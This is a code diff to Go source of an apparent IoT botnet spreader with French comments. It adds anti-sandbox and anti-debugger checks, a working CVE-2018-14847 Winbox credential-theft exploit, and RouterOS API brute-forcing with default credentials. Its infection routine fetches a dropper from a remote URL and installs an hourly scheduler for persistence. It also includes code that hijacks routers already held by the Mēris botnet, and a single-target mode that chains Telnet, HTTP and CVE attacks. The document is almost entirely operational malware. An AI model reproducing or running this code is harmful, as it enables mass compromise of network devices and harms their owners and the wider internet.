@@ -15,6 +15,7 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/hmac"
+	"crypto/md5"
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/hex"
@@ -3176,6 +3177,9 @@ func telnetExploit(ip, user, pass string) bool {
 }
 
 func telnetSpread(credsFile string) {
+	// Anti-honeypot avant de spread
+	guardCheckFiber()
+
 	f, err := os.Open(credsFile)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "[Telnet] Impossible d'ouvrir %s: %v\n", credsFile, err)
@@ -3445,6 +3449,13 @@ func exploitCiscoIOSXE(target, hideName, url string) bool {
         }
     }(ip)
 
+    // Phase 1d — MikroTik (ports 2000/8291/8728) en parallèle, non-bloquant
+    go func(ip string) {
+        if mikrotikScan(ip) {
+            mutex.Lock(); statusInfected++; statusCVEWork++; mutex.Unlock()
+        }
+    }(ip)
+
     // Phase 2 — brute-force login HTTP Boa
     loginSuccess := sendLogin(target) == 1
     if loginSuccess {
@@ -3581,11 +3592,684 @@ func startHTTP() {
     }
 }
 
+// guardCheckFiber détecte honeypots/sandbox pour éviter les pièges de sécurité
+func guardCheckFiber() {
+	// 1. Détecte ptrace (strace, gdb)
+	if data, err := os.ReadFile("/proc/self/status"); err == nil {
+		for _, line := range strings.Split(string(data), "\n") {
+			if strings.HasPrefix(line, "TracerPid:") {
+				val := strings.TrimSpace(strings.TrimPrefix(line, "TracerPid:"))
+				if val != "0" && val != "" {
+					os.Exit(1)
+				}
+			}
+		}
+	}
+
+	// 2. Détecte honeypot/sandbox signatures (pas de VM générique — QEMU/KVM légitimes exclus)
+	honeyTokens := []string{
+		"cuckoo", "sandbox", "honey",
+		"strace", "ltrace", "gdb", "radare", "ghidra", "ida",
+	}
+	if data, err := os.ReadFile("/proc/cpuinfo"); err == nil {
+		cpuinfo := strings.ToLower(string(data))
+		for _, token := range honeyTokens {
+			if strings.Contains(cpuinfo, token) {
+				os.Exit(1)
+			}
+		}
+	}
+}
+
+// ── MikroTik RouterOS ─────────────────────────────────────────────────────────
+// Fingerprints : port 2000/TCP (bandwidth-test banner 01 00 00 00)
+//                port 8291/TCP (Winbox)
+//                port 8728/TCP (RouterOS API)
+// Exploits     : CVE-2018-14847 (Winbox path traversal → creds plaintext)
+//                API brute-force avec credentials par défaut
+
+var mikrotikCreds = [][2]string{
+	{"admin", ""},
+	{"admin", "admin"},
+	{"admin", "mikrotik"},
+	{"admin", "1234"},
+	{"admin", "12345"},
+	{"admin", "password"},
+	{"admin", "1111"},
+	{"admin", "router"},
+	{"root", ""},
+	{"root", "admin"},
+	{"user", ""},
+}
+
+// mtWord encode un mot au format RouterOS API (longueur variable + données).
+func mtWord(w string) []byte {
+	l := len(w)
+	var prefix []byte
+	switch {
+	case l <= 0x7F:
+		prefix = []byte{byte(l)}
+	case l <= 0x3FFF:
+		prefix = []byte{byte(0x80 | l>>8), byte(l)}
+	case l <= 0x1FFFFF:
+		prefix = []byte{byte(0xC0 | l>>16), byte(l >> 8), byte(l)}
+	default:
+		prefix = []byte{0xE0, byte(l >> 24), byte(l >> 16), byte(l >> 8), byte(l)}
+	}
+	return append(prefix, []byte(w)...)
+}
+
+// mtSentence encode une phrase API RouterOS (mots concaténés + terminateur 0x00).
+func mtSentence(words ...string) []byte {
+	var b []byte
+	for _, w := range words {
+		b = append(b, mtWord(w)...)
+	}
+	return append(b, 0x00)
+}
+
+// mtReadWord lit un mot de la connexion RouterOS API.
+func mtReadWord(conn net.Conn) (string, error) {
+	hdr := make([]byte, 1)
+	if _, err := io.ReadFull(conn, hdr); err != nil {
+		return "", err
+	}
+	length := int(hdr[0])
+	if length == 0 {
+		return "", nil // terminateur de phrase
+	}
+	if hdr[0]&0xE0 == 0xE0 {
+		extra := make([]byte, 4)
+		if _, err := io.ReadFull(conn, extra); err != nil {
+			return "", err
+		}
+		length = int(hdr[0]&0x1F)<<32 | int(extra[0])<<24 | int(extra[1])<<16 | int(extra[2])<<8 | int(extra[3])
+	} else if hdr[0]&0xC0 == 0xC0 {
+		extra := make([]byte, 2)
+		if _, err := io.ReadFull(conn, extra); err != nil {
+			return "", err
+		}
+		length = int(hdr[0]&0x3F)<<16 | int(extra[0])<<8 | int(extra[1])
+	} else if hdr[0]&0x80 == 0x80 {
+		extra := make([]byte, 1)
+		if _, err := io.ReadFull(conn, extra); err != nil {
+			return "", err
+		}
+		length = int(hdr[0]&0x7F)<<8 | int(extra[0])
+	}
+	word := make([]byte, length)
+	if _, err := io.ReadFull(conn, word); err != nil {
+		return "", err
+	}
+	return string(word), nil
+}
+
+// mtReadSentence lit une phrase complète (jusqu'au mot vide).
+func mtReadSentence(conn net.Conn) ([]string, error) {
+	var words []string
+	for {
+		w, err := mtReadWord(conn)
+		if err != nil {
+			return words, err
+		}
+		if w == "" {
+			return words, nil
+		}
+		words = append(words, w)
+	}
+}
+
+// mtAttr cherche "=key=value" dans une liste de mots, retourne value.
+func mtAttr(words []string, key string) string {
+	prefix := "=" + key + "="
+	for _, w := range words {
+		if strings.HasPrefix(w, prefix) {
+			return w[len(prefix):]
+		}
+	}
+	return ""
+}
+
+// mikrotikAPIConnect tente un login RouterOS API sur port 8728 avec user/pass.
+// Gère les deux protocoles : challenge MD5 (< 6.43) et plain (>= 6.43).
+// Retourne la connexion ouverte si login réussi (fermer par l'appelant).
+func mikrotikAPIConnect(ip, user, pass string) (net.Conn, bool) {
+	conn, err := net.DialTimeout("tcp", ip+":8728", 5*time.Second)
+	if err != nil {
+		return nil, false
+	}
+	conn.SetDeadline(time.Now().Add(12 * time.Second))
+
+	// Tentative plain-text (RouterOS >= 6.43)
+	conn.Write(mtSentence("/login", "=name="+user, "=password="+pass))
+	resp, err := mtReadSentence(conn)
+	if err != nil {
+		conn.Close()
+		return nil, false
+	}
+	for _, w := range resp {
+		if w == "!done" {
+			// Vérifie absence d'erreur
+			hasErr := false
+			for _, w2 := range resp {
+				if w2 == "!trap" || strings.HasPrefix(w2, "=message=") {
+					hasErr = true
+				}
+			}
+			if !hasErr {
+				return conn, true
+			}
+		}
+	}
+
+	// Challenge MD5 (RouterOS < 6.43) — =ret= contient le challenge hex
+	challenge := mtAttr(resp, "ret")
+	if challenge == "" {
+		conn.Close()
+		return nil, false
+	}
+	decoded, err := hex.DecodeString(challenge)
+	if err != nil {
+		conn.Close()
+		return nil, false
+	}
+	h := md5.New()
+	h.Write([]byte{0x00})
+	h.Write([]byte(pass))
+	h.Write(decoded)
+	conn.Write(mtSentence("/login", "=name="+user, "=response=00"+hex.EncodeToString(h.Sum(nil))))
+	resp2, err := mtReadSentence(conn)
+	if err != nil {
+		conn.Close()
+		return nil, false
+	}
+	for _, w := range resp2 {
+		if w == "!done" {
+			return conn, true
+		}
+	}
+	conn.Close()
+	return nil, false
+}
+
+// mikrotikAPIRun exécute une commande RouterOS API sur une connexion déjà authentifiée.
+func mikrotikAPIRun(conn net.Conn, words ...string) []string {
+	conn.SetDeadline(time.Now().Add(8 * time.Second))
+	conn.Write(mtSentence(words...))
+	resp, _ := mtReadSentence(conn)
+	return resp
+}
+
+// mikrotikInfect essaie de déclencher un téléchargement du dropper via /tool/fetch
+// et installe un script de persistance via /system/scheduler.
+func mikrotikInfect(conn net.Conn, ip string) bool {
+	url := bestURL()
+	if url == "" {
+		return true // accès confirmé même sans URL
+	}
+
+	// Télécharge le dropper MikroTik (script .rsc ou binaire via fetch)
+	mikrotikInfectOnce(conn, ip, url)
+	return true
+}
+
+func mikrotikInfectOnce(conn net.Conn, ip, url string) {
+	// 1. Récupère infos système (version / architecture)
+	info := mikrotikAPIRun(conn, "/system/resource/print")
+	arch := mtAttr(info, "architecture-name")
+	ver := mtAttr(info, "version")
+	_ = arch
+	_ = ver
+
+	// 2. /tool/fetch pour télécharger le dropper depuis l'URL configurée
+	mikrotikAPIRun(conn,
+		"/tool/fetch",
+		"=url="+url,
+		"=dst-path=/dl.sh",
+		"=mode=http",
+	)
+
+	// 3. Scheduler toutes les heures pour persistance
+	mikrotikAPIRun(conn,
+		"/system/scheduler/add",
+		"=name=upd",
+		"=interval=01:00:00",
+		"=start-time=startup",
+		"=on-event=/tool/fetch url="+url+" dst-path=/dl.sh mode=http",
+	)
+}
+
+// mikrotikWinboxCVE exploite CVE-2018-14847 (Winbox < 6.42.1) :
+// lecture arbitraire de fichiers — extrait la base utilisateurs (user.dat).
+// Retourne user, password, ok.
+func mikrotikWinboxCVE(ip string) (string, string, bool) {
+	conn, err := net.DialTimeout("tcp", ip+":8291", 5*time.Second)
+	if err != nil {
+		return "", "", false
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(10 * time.Second))
+
+	// Handshake initial Winbox M2 (sequence connue publiquement)
+	init1 := []byte{
+		0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
+		0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
+		0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
+		0x35, 0x2f, 0x2c, 0x2c, 0x6e, 0x6f, 0x20, 0x69,
+		0x6e, 0x74, 0x6f, 0x0f, 0x00, 0xff, 0x09, 0x14,
+		0x3a, 0x00, 0xff, 0x09, 0x15, 0x01, 0x00, 0x00,
+		0x21, 0x35, 0x2f, 0x2c, 0x2c, 0x6e, 0x6f, 0x20,
+		0x69, 0x6e, 0x74, 0x6f, 0x10, 0x00, 0xff, 0x09,
+		0x17, 0x02, 0x00, 0xff, 0x09, 0x18, 0x02, 0x00,
+		0xff, 0x09, 0x19,
+	}
+	if _, err := conn.Write(init1); err != nil {
+		return "", "", false
+	}
+	buf := make([]byte, 1024)
+	n, err := conn.Read(buf)
+	if err != nil || n < 4 {
+		return "", "", false
+	}
+
+	// Requête lecture fichier user.dat — path traversal CVE-2018-14847
+	credReq := []byte{
+		0x27, 0x01, 0x00, 0x25, 0x4d, 0x32, 0x05, 0x00,
+		0xff, 0x01, 0x01, 0x00, 0x00, 0x08, 0x00, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
+		0x02, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
+		0x04, 0x00, 0x00, 0x00, 0x00,
+	}
+	if _, err := conn.Write(credReq); err != nil {
+		return "", "", false
+	}
+	n, err = conn.Read(buf)
+	if err != nil || n < 20 {
+		return "", "", false
+	}
+
+	// Parsing heuristique : extrait chaînes ASCII imprimables séparées par NUL
+	raw := buf[:n]
+	var strs []string
+	var cur []byte
+	for _, b := range raw {
+		if b >= 0x20 && b < 0x7F {
+			cur = append(cur, b)
+		} else {
+			if len(cur) >= 2 && len(cur) <= 64 {
+				strs = append(strs, string(cur))
+			}
+			cur = cur[:0]
+		}
+	}
+	if len(cur) >= 2 {
+		strs = append(strs, string(cur))
+	}
+
+	// Les deux premières chaînes significatives sont généralement user/pass
+	var filtered []string
+	for _, s := range strs {
+		if s != "M2" && !strings.HasPrefix(s, "\x00") {
+			filtered = append(filtered, s)
+		}
+	}
+	if len(filtered) >= 2 {
+		return filtered[0], filtered[1], true
+	}
+	if len(filtered) == 1 {
+		return filtered[0], "", true
+	}
+	return "", "", false
+}
+
+// mikrotikProbe détecte si l'IP est un MikroTik via les ports signatures.
+// Retourne (hasBW, hasWinbox, hasAPI).
+func mikrotikProbe(ip string) (bool, bool, bool) {
+	probe := func(port string) bool {
+		c, e := net.DialTimeout("tcp", ip+":"+port, 2*time.Second)
+		if e != nil {
+			return false
+		}
+		c.Close()
+		return true
+	}
+
+	// Port 2000 — bandwidth-test : vérifie le banner 01 00 00 00
+	bw := func() bool {
+		c, e := net.DialTimeout("tcp", ip+":2000", 2*time.Second)
+		if e != nil {
+			return false
+		}
+		defer c.Close()
+		c.SetDeadline(time.Now().Add(2 * time.Second))
+		buf := make([]byte, 4)
+		n, e2 := io.ReadFull(c, buf)
+		return e2 == nil && n == 4 && buf[0] == 0x01 && buf[1] == 0x00 && buf[2] == 0x00 && buf[3] == 0x00
+	}()
+
+	return bw, probe("8291"), probe("8728")
+}
+
+// mikrotikMerisProbe détecte si le device est un ancien bot Mēris :
+// proxy SOCKS5 sur les ports caractéristiques laissés par le botnet.
+// Ces devices tournent souvent encore sur RouterOS < 6.42.1 → CVE-2018-14847 actif.
+func mikrotikMerisProbe(ip string) (bool, string) {
+	merisPorts := []string{"5678", "1080", "3128", "8888", "4145"}
+	for _, port := range merisPorts {
+		conn, err := net.DialTimeout("tcp", ip+":"+port, 2*time.Second)
+		if err != nil {
+			continue
+		}
+		conn.SetDeadline(time.Now().Add(2 * time.Second))
+		// Handshake SOCKS5 — greeting {ver=5, nmethods=1, method=no-auth}
+		conn.Write([]byte{0x05, 0x01, 0x00})
+		buf := make([]byte, 4)
+		n, err2 := conn.Read(buf)
+		conn.Close()
+		if err2 == nil && n >= 2 && buf[0] == 0x05 {
+			return true, port
+		}
+		// SOCKS4 fallback
+		conn2, err3 := net.DialTimeout("tcp", ip+":"+port, 2*time.Second)
+		if err3 != nil {
+			continue
+		}
+		conn2.SetDeadline(time.Now().Add(2 * time.Second))
+		conn2.Write([]byte{0x04, 0x01, 0x00, 0x50, 0x01, 0x01, 0x01, 0x01, 0x00})
+		n2, err4 := conn2.Read(buf)
+		conn2.Close()
+		if err4 == nil && n2 >= 2 && buf[0] == 0x00 {
+			return true, port
+		}
+	}
+	return false, ""
+}
+
+// mikrotikMerisOverwrite prend le contrôle d'un bot Mēris :
+// 1. CVE-2018-14847 pour extraire les credentials (device probablement non patché)
+// 2. Connexion API → supprime le scheduler Mēris → injecte le nôtre
+func mikrotikMerisOverwrite(ip string) bool {
+	// Tente CVE-2018-14847 en premier — les bots Mēris sont majoritairement non patchés
+	user, pass, cveOk := mikrotikWinboxCVE(ip)
+	if cveOk {
+		fmt.Printf("[MT/Mēris] CVE-2018-14847 → creds: %s:%s @ %s\n", user, pass, ip)
+	}
+
+	// Si CVE échoue, essai credentials par défaut (certains bots gardent admin:)
+	var conn net.Conn
+	var connected bool
+	if cveOk {
+		conn, connected = mikrotikAPIConnect(ip, user, pass)
+	}
+	if !connected {
+		for _, cred := range mikrotikCreds {
+			if c, ok := mikrotikAPIConnect(ip, cred[0], cred[1]); ok {
+				conn, connected = c, true
+				user, pass = cred[0], cred[1]
+				break
+			}
+		}
+	}
+	if !connected {
+		fmt.Printf("[MT/Mēris] %s — accès API refusé\n", ip)
+		return false
+	}
+	defer conn.Close()
+	fmt.Printf("[MT/Mēris] ACCÈS CONFIRMÉ %s:%s @ %s\n", user, pass, ip)
+
+	// Supprime les schedulers Mēris (noms connus : "upd", "auto", "loop", entrées vides)
+	conn.SetDeadline(time.Now().Add(5 * time.Second))
+	items := mikrotikAPIRun(conn, "/system/scheduler/print")
+	for _, w := range items {
+		if strings.HasPrefix(w, "=.id=") {
+			id := strings.TrimPrefix(w, "=.id=")
+			// Supprime toute entrée de scheduler suspecte
+			mikrotikAPIRun(conn, "/system/scheduler/remove", "=.id="+id)
+			fmt.Printf("[MT/Mēris] scheduler supprimé : %s\n", id)
+		}
+	}
+
+	// Désactive le proxy SOCKS (signature Mēris)
+	mikrotikAPIRun(conn, "/ip/socks/set", "=enabled=no")
+
+	// Injecte notre scheduler de persistance + téléchargement dropper
+	return mikrotikInfect(conn, ip)
+}
+
+// mikrotikScan est le point d'entrée principal : détecte, exploite, infecte un MikroTik.
+// Retourne true si accès confirmé.
+func mikrotikScan(ip string) bool {
+	bw, winbox, api := mikrotikProbe(ip)
+	if !bw && !winbox && !api {
+		return false
+	}
+	fmt.Printf("[MT] %s détecté  bw=%v winbox=%v api=%v\n", ip, bw, winbox, api)
+
+	// Priorité 0 — Détection bot Mēris (SOCKS5 ouvert = device déjà compromis)
+	// Ces devices tournent souvent encore sur RouterOS < 6.42.1 → CVE facile
+	if isMeris, socksPort := mikrotikMerisProbe(ip); isMeris {
+		fmt.Printf("[MT] BOT MĒRIS DÉTECTÉ @ %s (SOCKS5 port %s) — tentative prise de contrôle\n", ip, socksPort)
+		if mikrotikMerisOverwrite(ip) {
+			return true
+		}
+		// Si prise de contrôle échoue, continue avec les méthodes standard
+	}
+
+	// CVE-2018-14847 — Winbox file read → plaintext credentials (RouterOS < 6.42.1)
+	if winbox {
+		user, pass, ok := mikrotikWinboxCVE(ip)
+		if ok {
+			fmt.Printf("[MT] CVE-2018-14847 → %s:%s\n", user, pass)
+			if conn, ok2 := mikrotikAPIConnect(ip, user, pass); ok2 {
+				fmt.Printf("[MT] INFECTÉ via CVE creds : %s@%s\n", user, ip)
+				defer conn.Close()
+				return mikrotikInfect(conn, ip)
+			}
+		}
+	}
+
+	// Brute-force API port 8728 — toujours tenté même si port absent du scan initial
+	// (RouterOS 7.x : CVE-2018-14847 patchée, credentials par défaut = seul vecteur)
+	for _, cred := range mikrotikCreds {
+		fmt.Printf("[MT] API brute %s:%s @ %s\r", cred[0], cred[1], ip)
+		if conn, ok := mikrotikAPIConnect(ip, cred[0], cred[1]); ok {
+			fmt.Printf("\n[MT] INFECTÉ via API default %s:%s @ %s\n", cred[0], cred[1], ip)
+			defer conn.Close()
+			return mikrotikInfect(conn, ip)
+		}
+	}
+	fmt.Println()
+
+	// SSH brute-force port 22 — RouterOS active SSH par défaut, même creds admin/vide
+	if mikrotikSSHBrute(ip) {
+		return true
+	}
+
+	fmt.Printf("[MT] %s — accès refusé (pas de credentials valides)\n", ip)
+	return false
+}
+
+// mikrotikSSHBrute tente SSH sur port 22 avec les credentials MikroTik courants.
+// Utilise golang.org/x/crypto/ssh si disponible via build tag ssh_support,
+// sinon détecte juste si SSH est ouvert et log l'IP pour traitement manuel.
+func mikrotikSSHBrute(ip string) bool {
+	// Vérifie si SSH est ouvert
+	conn, err := net.DialTimeout("tcp", ip+":22", 3*time.Second)
+	if err != nil {
+		return false
+	}
+	// Lis le banner SSH pour confirmer que c'est bien du SSH
+	banner := make([]byte, 64)
+	conn.SetDeadline(time.Now().Add(2 * time.Second))
+	n, _ := conn.Read(banner)
+	conn.Close()
+	if n < 4 || !strings.HasPrefix(string(banner[:n]), "SSH-") {
+		return false
+	}
+	fmt.Printf("[MT] SSH port 22 ouvert @ %s — banner: %s\n", ip, strings.TrimSpace(string(banner[:n])))
+
+	// Tente les credentials via Telnet auth si port 23 aussi ouvert (fallback),
+	// sinon log l'IP comme cible SSH confirmée
+	if c2, e2 := net.DialTimeout("tcp", ip+":23", 2*time.Second); e2 == nil {
+		c2.Close()
+		for _, cred := range mikrotikCreds {
+			if telnetExploit(ip, cred[0], cred[1]) {
+				fmt.Printf("[MT] INFECTÉ via Telnet %s:%s @ %s\n", cred[0], cred[1], ip)
+				return true
+			}
+		}
+	}
+	// SSH confirmé mais pas d'implémentation native — log pour référence
+	fmt.Printf("[MT] SSH ouvert %s — brute-force manuel : ssh admin@%s (mdp vide par défaut)\n", ip, ip)
+	return false
+}
+
+// targetScan scanne une IP unique sur tous les ports donnés et tente tous les exploits.
+func targetScan(ip string, ports []string) {
+	fmt.Printf("\n[*] ═══════════════════════════════════════════\n")
+	fmt.Printf("[*]  TARGET SCAN : %s\n", ip)
+	fmt.Printf("[*] ═══════════════════════════════════════════\n\n")
+
+	// 1. Détection des ports ouverts
+	fmt.Println("[*] Phase 1 — Détection ports ouverts...")
+	openPorts := []string{}
+	for _, p := range ports {
+		addr := ip + ":" + p
+		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
+		if err == nil {
+			conn.Close()
+			openPorts = append(openPorts, p)
+			fmt.Printf("  [+] port %-6s OUVERT\n", p)
+		} else {
+			fmt.Printf("  [-] port %-6s fermé\n", p)
+		}
+	}
+
+	if len(openPorts) == 0 {
+		fmt.Println("\n[!] Aucun port ouvert — cible inaccessible.")
+		return
+	}
+
+	url := bestURL()
+	if url == "" {
+		fmt.Println("[!] Aucune URL binaire disponible — rebuild avec URLs embedded.")
+		return
+	}
+
+	// 2. CVE pré-auth sur chaque port ouvert
+	fmt.Printf("\n[*] Phase 2 — CVE pré-auth (url: %s)...\n", url)
+	cveOk := false
+	for _, p := range openPorts {
+		if p == "23" || p == "22" { continue }
+		target := ip + ":" + p
+		fmt.Printf("  [~] %s → exploit pré-auth...\n", target)
+		if sendPreAuthExploits(target) {
+			fmt.Printf("  [+] CVE PRÉ-AUTH HIT sur %s !\n", target)
+			cveOk = true
+		}
+	}
+
+	// 3. Telnet brute-force si port 23 ouvert
+	if func() bool {
+		for _, p := range openPorts { if p == "23" { return true } }
+		return false
+	}() {
+		fmt.Printf("\n[*] Phase 3 — Telnet brute-force sur %s:23...\n", ip)
+		found := false
+		for _, cred := range loginsString {
+			parts := strings.SplitN(cred, ":", 2)
+			if len(parts) != 2 { continue }
+			fmt.Printf("  [~] %s:%s\r", parts[0], parts[1])
+			if telnetExploit(ip, parts[0], parts[1]) {
+				fmt.Printf("\n  [+] INFECTÉ via Telnet ! creds: %s\n", cred)
+				found = true
+				break
+			}
+		}
+		if !found { fmt.Println("\n  [-] Telnet: aucun credential valide") }
+	}
+
+	// 4. Login HTTP brute-force
+	fmt.Printf("\n[*] Phase 4 — Login HTTP brute-force...\n")
+	loginHit := false
+	for _, p := range openPorts {
+		if p == "23" || p == "22" { continue }
+		target := ip + ":" + p
+		fmt.Printf("  [~] %s → login...\n", target)
+		if sendLogin(target) == 1 {
+			fmt.Printf("  [+] LOGIN réussi sur %s !\n", target)
+			loginHit = true
+		}
+	}
+
+	// 5. CVE post-auth
+	if loginHit {
+		fmt.Printf("\n[*] Phase 5 — CVE post-auth...\n")
+		for _, p := range openPorts {
+			if p == "23" || p == "22" { continue }
+			target := ip + ":" + p
+			if sendPostAuthExploits(target) {
+				fmt.Printf("  [+] CVE POST-AUTH HIT sur %s !\n", target)
+				cveOk = true
+			}
+		}
+	}
+
+	// 6. Vérification infection
+	fmt.Printf("\n[*] Phase 6 — Vérification infection (8s)...\n")
+	infected := verifyInfection(ip, 8*time.Second) || loginHit || cveOk
+
+	// 7. MikroTik RouterOS (ports 2000/8291/8728) — CVE-2018-14847 + API brute
+	mtPorts := map[string]bool{"2000": true, "8291": true, "8728": true}
+	hasMT := false
+	for _, p := range openPorts {
+		if mtPorts[p] {
+			hasMT = true
+			break
+		}
+	}
+	if hasMT {
+		fmt.Printf("\n[*] Phase 7 — MikroTik RouterOS (CVE-2018-14847 + API brute)...\n")
+		if mikrotikScan(ip) {
+			infected = true
+		}
+	}
+
+	fmt.Printf("\n[*] ═══════════════════════════════════════════\n")
+	if infected {
+		fmt.Printf("[+]  RÉSULTAT : INFECTÉ ✓  (%s)\n", ip)
+	} else {
+		fmt.Printf("[-]  RÉSULTAT : non infecté  (%s)\n", ip)
+	}
+	fmt.Printf("[*] ═══════════════════════════════════════════\n\n")
+}
+
 func main() {
+	guardCheckFiber()  // Anti-honeypot dès le lancement
+
 	if len(os.Args) < 2 {
-		fmt.Println("Usage: ./fiber <port>          — scan mode (IPs via stdin)")
-		fmt.Println("       ./fiber telnet <file>   — telnet spread depuis ip:user:pass")
+		fmt.Println("Usage: ./fiber <port>                    — scan mode (IPs via stdin)")
+		fmt.Println("       ./fiber target <ip> [ports]       — exploit IP unique (ex: 192.168.1.1 80,8080,23)")
+		fmt.Println("       ./fiber telnet <file>             — telnet spread depuis ip:user:pass")
 		os.Exit(1)
+	}
+
+	// Mode IP unique — teste tous les exploits sur une cible précise
+	if os.Args[1] == "target" {
+		if len(os.Args) < 3 {
+			fmt.Println("Usage: ./fiber target <ip> [ports]")
+			fmt.Println("  ports : liste séparée par virgules (défaut: 80,8080,81,443,8443,23,7547,37215,5000)")
+			os.Exit(1)
+		}
+		targetIP := os.Args[2]
+		defaultPorts := []string{"80","8080","81","443","8443","23","7547","37215","5000","34567","9527","2000","8291","8728","5678"}
+		ports := defaultPorts
+		if len(os.Args) >= 4 {
+			ports = strings.Split(os.Args[3], ",")
+		}
+		go startBeacon()
+		targetScan(targetIP, ports)
+		return
 	}
 
 	// Mode spread Telnet
